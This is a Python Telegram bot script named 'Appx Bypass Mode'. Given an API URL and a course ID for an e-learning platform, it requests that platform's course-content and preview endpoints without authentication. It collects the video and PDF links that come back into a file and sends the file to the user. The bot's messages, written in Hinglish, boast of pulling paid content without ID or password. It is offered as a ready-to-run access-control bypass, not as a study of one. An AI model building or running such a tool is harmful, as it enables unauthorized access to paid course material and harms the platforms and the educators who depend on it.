import os
import asyncio
import aiohttp
from pyrogram import Client, filters

# Configs
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")

app = Client("appx-bypass", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("start"))
async def start(client, message):
    await message.reply_text(
        "🔓 **Appx Bypass Mode v6.0**\n\n"
        "Bina ID/Password ke content nikalne ke liye:\n"
        "`/bypass [API_LINK] [COURSE_ID]`\n\n"
        "Example:\n`/bypass https://api.classx.co.in 123`"
    )

@app.on_message(filters.command("bypass"))
async def bypass_handler(client, message):
    if len(message.command) < 3:
        return await message.reply_text("❌ Format: `/bypass [Link] [CourseID]`")
    
    api_url = message.command[1].rstrip('/')
    course_id = message.command[2]
    
    m = await message.reply_text("🕵️ **Bypassing Security... Pura app khali kar raha hoon...**")
    
    # Bina Token ke ye 3 endpoints check karega
    bypass_endpoints = [
        f"{api_url}/v1/course/content/{course_id}", # Direct check
        f"{api_url}/v2/course/content/{course_id}", # V2 check
        f"{api_url}/v1/course/preview/{course_id}"  # Preview bypass (Main)
    ]
    
    success = False
    file_name = f"Bypassed_{course_id}.txt"
    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 11)"}

    async with aiohttp.ClientSession() as session:
        for url in bypass_endpoints:
            try:
                async with session.get(url, headers=headers, timeout=10) as r:
                    data = await r.json()
                    if data.get("success") and data.get("data"):
                        with open(file_name, "w", encoding="utf-8") as f:
                            f.write(f"🔓 BYPASS SUCCESSFUL: {course_id}\n\n")
                            for folder in data['data']:
                                f.write(f"\n📁 {folder.get('title')}\n" + "="*20 + "\n")
                                for v in folder.get("videos", []):
                                    f.write(f"{v['title']} : {v['url']}\n")
                                for n in folder.get("notes", []):
                                    f.write(f"PDF: {n['title']} : {n['url']}\n")
                        
                        await message.reply_document(file_name, caption=f"🔥 **Bypass Done!**\nCourse: {course_id}")
                        os.remove(file_name)
                        success = True
                        break
            except: continue

    if not success:
        await m.edit("🔒 **Full Lock!**\n\nBina Token ke server data nahi de raha. Ise sirf ID/Password ya Token se hi khola ja sakta hai.")
    else:
        await m.delete()

# Heroku Startup
async def main():
    async with app:
        print("🚀 BYPASS BOT ONLINE!")
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
    
